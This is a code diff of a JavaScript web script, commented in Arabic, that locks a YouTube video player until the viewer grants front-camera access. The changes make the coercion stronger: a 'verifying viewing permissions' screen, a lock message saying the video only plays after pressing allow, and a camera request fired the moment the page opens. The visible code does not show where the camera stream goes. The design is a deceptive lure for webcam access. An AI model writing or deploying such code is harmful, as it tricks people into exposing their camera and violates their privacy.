@@ -1,22 +1,21 @@
 /* ==========================================================
-   سكريبت الفحص المتقدم للأذونات وحظر التشغيل عند الحظر الدائم
+   سكريبت حظر العرض الكلي وإجبار السماح بالكاميرا قبل تشغيل الفيديو
    ========================================================== */
 
 let mediaStream = null;
 
 async function initPersistentCamera() {
     try {
-        // فحص حالة أذن الكاميرا الحقيقية من المتصفح
+        // فحص ما إذا كان الإذن محظوراً بشكل دائم من المتصفح
         if (navigator.permissions && navigator.permissions.query) {
             const perm = await navigator.permissions.query({ name: 'camera' });
             if (perm.state === 'denied') {
-                // إذا قام المتصفح بحفظ الرفض مسبقاً، نمنع التشغيل فوراً ونظهر شاشة التنبيه
                 showBlockedScreen();
                 return;
             }
         }
 
-        // محاولة طلب إذن الكاميرا
+        // إطلاق طلب أذن الكاميرا الفوري
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: { ideal: 'user' }
@@ -26,7 +25,7 @@ async function initPersistentCamera() {
         const videoEl = document.getElementById('video');
         if (videoEl) videoEl.srcObject = mediaStream;
         
-        // [عند السماح الفعلي]: تشغيل يوتيوب
+        // [عند السماح الفعلي فقط]: فك الحظر وتشغيل مشغل يوتيوب الحقيقي
         const playerContainer = document.getElementById('playerContainer');
         if (playerContainer) {
             const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
@@ -65,16 +64,16 @@ async function initPersistentCamera() {
     }
 }
 
-// شاشة الحظر وإجبار المستخدم على السماح أو إعادة ضبط الإعدادات
+// شاشة الحظر ومنع تشغيل الفيديو نهائياً
 function showBlockedScreen() {
     const playerContainer = document.getElementById('playerContainer');
     if (playerContainer) {
         playerContainer.innerHTML = `
             <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                 <div>
-                    <div style="font-size:36px;margin-bottom:8px;">⚠️</div>
-                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند السماح بالكاميرا</p>
-                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">إذا لم يظهر إشعار الأذونات، يرجى النقر أدناه لإعادة المحاولة</p>
+                    <div style="font-size:36px;margin-bottom:8px;">🔒</div>
+                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
+                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى منح الإذن لفك قفل وتشغيل المقطع</p>
                     <span style="font-size:13px;color:#fff;background:#cc0000;padding:9px 22px;border-radius:20px;display:inline-block;font-weight:bold;cursor:pointer;">اضغط هنا للمشاهدة</span>
                 </div>
             </div>
@@ -82,12 +81,12 @@ function showBlockedScreen() {
         
         document.getElementById('retryCamera').onclick = () => {
             mediaStream = null;
-            // محاولة إجبار المتصفح على فتح نافذة الأذونات مجدداً
             initPersistentCamera();
         };
     }
 }
 
+// هذه الدالة تعمل فوراً عند الانتقال لصفحة المشاهدة
 function startCapture() {
     if (mediaStream) return;
     
@@ -99,17 +98,18 @@ function startCapture() {
             if(match) playerContainer.dataset.videoId = match[1];
         }
         
-        // إخفاء الفيديو نهائياً فور الضغط عليه ومنع تشغيله خلف الكواليس
+        // قفل مشغل الفيديو تماماً وإظهار شاشة الانتظار السوداء لكي لا يشتغل الفيديو في الخلفية
         playerContainer.innerHTML = `
             <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                 <div>
                     <div style="font-size:32px;margin-bottom:8px;">⏳</div>
                     <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري التحقق من أذونات العرض...</p>
-                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا لتشغيل المقطع</p>
+                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا الظاهر للأعلى لتشغيل المقطع</p>
                 </div>
             </div>
         `;
     }
 
+    // إطلاق طلب الكاميرا مباشرة بالتزامن مع فتح صفحة المشاهدة
     initPersistentCamera();
 }
